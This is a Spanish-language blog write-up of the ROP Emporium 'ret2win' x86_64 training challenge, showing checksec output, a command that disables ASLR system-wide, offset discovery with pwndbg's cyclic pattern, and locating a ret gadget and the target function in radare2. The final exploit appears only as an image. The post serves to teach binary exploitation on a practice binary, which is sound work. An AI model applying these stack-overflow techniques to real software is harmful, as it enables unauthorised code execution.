---
title: Solución ropemporium ret2win
date: 2023-10-09
categories: [rop, 64bits, bof, heap overflow]
tags: [64bits, bof, heap-overflow, rop] #minúsculas-
---
# Ret2win
En esta entrada estaré resolviendo ret2win ropemporium de 64 bits x86_64

Antes de nada descargamos el binario y miramos las protecciones que tiene, en este caso tenemos NX activado que es data execution prevention una proteccion que el que hace es no permitiros ejecutar instrucciones a bajo nivel.


También decir que el ASLR(Address Space Layout Randomization) lo he deshabilitado con el siguiente comando:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

```javascript
checksec --file=ret2win
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols	 No	0		3		ret2win

```
Si ejecutamos el binario podemos ver que ya nos da una pista 
```javascript
./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
zsh: segmentation fault  ./ret2win
```
## pwndbg
Vamos a abrir pwndgb un plugin de gdb que nos permitirá debuggear el binario, que tiene diferentes utilidades para ayudar en la explotación de binarios

![](/assets/img/rop/pwndbg2.png)

gdb nos mostrará  los registros a continuación:

![](/assets/img/rop/pwndbg.png)

¿Qué podemos ver aquí? RBP sobrescrito con A en hexadecimal 41 y también RSP. 

¿Por qué no hemos sobrescrito también RIP? Bueno, en realidad si hemos sobrescrito RIP, el RIP no veremos el valor, ya que contiene ret si vemos el valor de ret contiene nuestras A, esa es una particularidad a tener en cuenta al explotar binarios en 64 bits.

Vamos a crear un pattern para saber el offset, para eso podemos usar cyclic de pwndbg de la siguiente forma.
```bash
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
```
Luego copiamos el valor de ret que en este caso es

```bash
 ► 0x400755 <pwnme+109>    ret    <0x6161616161616166>
 ```
Y hacemos esto en pwndbg para saber el offset
```bash
pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```
El Offset es de 40 bytes. A continuación pues primero acontecer el desbordamiento deñ buffer para poder saltar otra vez al inicio del programa y asi poder leer la función que necesitamos.

Para saber la dirección de ret podemos usar ropgadget que está dentro de pwndbg aquí podemos ver que nos retorna 95 gadgets entre ellos ret.
![](/assets/img/rop/ropgadget.png)

Así que ret sabemos que es el siguiente:
![](/assets/img/rop/ret.png)

Ahora nos falta saltar a la función que queremos para leer la flag para saber eso necesitamos saber primero que función es, y para eso usaremos radare
![](/assets/img/rop/radare.png)

En la imagen anterior podemos ver con afl las funciones que tiene el binario. Allí dentro vemos una que es sym.ret2win, que si la investigamos con pdf podemos ver que la función hace un cat a flag.txt. De esta forma obtenemos la dirección de nuestra función.

# Exploit final

![](/assets/img/rop/exploit.png)